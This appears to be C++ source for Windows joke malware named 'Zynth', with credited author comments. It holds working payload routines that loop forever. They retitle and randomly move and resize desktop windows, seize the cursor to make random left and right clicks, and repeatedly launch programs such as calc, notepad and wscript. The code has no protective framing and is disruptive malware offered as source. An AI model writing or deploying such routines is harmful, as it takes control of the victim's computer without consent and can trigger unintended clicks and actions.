#include "Zynth.hh"

BOOL
WINAPI
EnumWindowProc(
	_In_ HWND   hWnd,
	_In_ LPARAM lParam
)
{   // Code by Voltizer / ChrisRM_380 + Sapphire
	INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN );
	INT h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	SendMessageTimeoutW( hWnd, WM_SETTEXT, 0, ( LPARAM )GenUnicodeString( Xorshift( ) % 150 ), SMTO_ABORTIFHUNG, 100, NULL );

	SetWindowPos( hWnd, NULL, Xorshift( ) % w, Xorshift( ) % h, Xorshift( ) % w, Xorshift( ) % h, SWP_NOZORDER );

	return TRUE;
}

VOID
WINAPI
CursorMove(
	VOID
)
{   // Code by Sapphire | Sleep func changed by Voltizer / ChrisRM_380
	INT iClickEvents[ 2 ][ 2 ] = {
		{ MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP },
		{ MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	};

	while ( true )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN );
		INT h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		SetCursorPos( Xorshift( ) % w, Xorshift( ) % h );

		INT iIndex = Xorshift( ) % 2;
		mouse_event( iClickEvents[ iIndex ][ 0 ], 0, 0, 0, 0 );
		mouse_event( iClickEvents[ iIndex ][ 1 ], 0, 0, 0, 0 );

		Sleep( Xorshift( ) % 500 + 100 );
	}
}

VOID
WINAPI
WindowMess(
	VOID
)
{
	while ( true )
	{   // Code by Voltizer / ChrisRM_380 + Sapphire

		EnumChildWindows( GetDesktopWindow( ), EnumWindowProc, NULL );
		Sleep( Xorshift( ) % 1000 );
	}
}


VOID
WINAPI
RandomPrograms(
	VOID
)
{
	while ( true )
	{   // Code by Voltizer / ChrisRM_380 + Xidroria, no xidrorka allowed ! ! !
		LPCWSTR lpApps[ ] = { L"calc.exe", L"notepad.exe", L"wscript.exe", L"winver.exe" };

		int iIndex = Xorshift( ) % _countof( lpApps );
		ShellExecuteW( HWND_DESKTOP, L"open", lpApps[iIndex], NULL, NULL, SW_SHOW );
		Sleep( Xorshift( ) % 1000 );
	}
}
